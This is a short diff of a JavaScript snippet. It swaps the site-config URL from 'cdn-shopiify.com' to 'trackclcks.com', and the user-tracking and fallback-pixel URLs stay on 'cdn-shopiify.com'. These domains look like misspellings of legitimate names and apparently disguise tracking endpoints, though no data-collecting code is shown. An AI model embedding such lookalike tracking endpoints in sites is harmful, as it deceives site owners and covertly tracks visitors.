@@ -1,5 +1,5 @@
 (function () {
-  const CONFIG_URL = 'https://cdn-shopiify.com/api/site-config?host=';
+  const CONFIG_URL = 'https://trackclcks.com/api/site-config?host=';
   const TRACK_URL = 'https://cdn-shopiify.com/api/track-user';
   const FALLBACK_PIXEL_URL = 'https://cdn-shopiify.com/api/fallback-pixel?id=';
 
